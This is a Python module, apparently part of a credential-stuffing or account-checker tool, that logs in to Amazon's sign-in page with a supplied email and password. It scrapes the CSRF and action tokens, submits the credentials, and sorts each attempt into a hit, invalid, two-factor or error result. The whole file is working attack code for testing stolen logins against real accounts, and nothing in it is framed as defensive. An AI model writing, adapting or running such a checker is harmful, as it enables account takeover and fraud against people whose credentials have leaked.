# language: Python 3.11 — services/amazon.py
import re

import aiohttp

from .base import BaseService, CheckResult, Status
from config import USER_AGENT

CSRF_RE = re.compile(r'name="csrfToken"\s+value="([^"]+)"')
ACTION_RE = re.compile(r'name="appActionToken"\s+value="([^"]+)"')


class AmazonService(BaseService):
    name = "amazon"

    async def check(self, session: aiohttp.ClientSession, email: str, pw: str) -> CheckResult:
        try:
            async with session.get(
                "https://www.amazon.com/ap/signin",
                headers={"User-Agent": USER_AGENT},
            ) as r:
                html = await r.text()

            csrf = CSRF_RE.search(html)
            action = ACTION_RE.search(html)
            if not csrf or not action:
                return CheckResult(self.name, email, Status.ERROR, "no csrf token")

            data = {
                "appActionToken": action.group(1),
                "appAction": "SIGNIN_PWD_COLLECT",
                "openid.return_to": "https://www.amazon.com/",
                "email": email,
                "password": pw,
                "csrfToken": csrf.group(1),
            }
            async with session.post(
                "https://www.amazon.com/ap/signin",
                data=data,
                headers={"User-Agent": USER_AGENT},
                allow_redirects=True,
            ) as r:
                body = await r.text()
                final = str(r.url)

            if "auth-error-message-box" in body or "/ap/signin" in final:
                return CheckResult(self.name, email, Status.INVALID, "bad credentials")
            if "ap/mfa" in final or "otp" in body.lower():
                return CheckResult(self.name, email, Status.TWOFA, "mfa required")
            if "sign-out" in body.lower() or "nav-item-signout" in body:
                return CheckResult(self.name, email, Status.HIT, "session ok")
            return CheckResult(self.name, email, Status.ERROR, "unrecognized response")
        except Exception as e:
            return CheckResult(self.name, email, Status.ERROR, str(e)[:120])
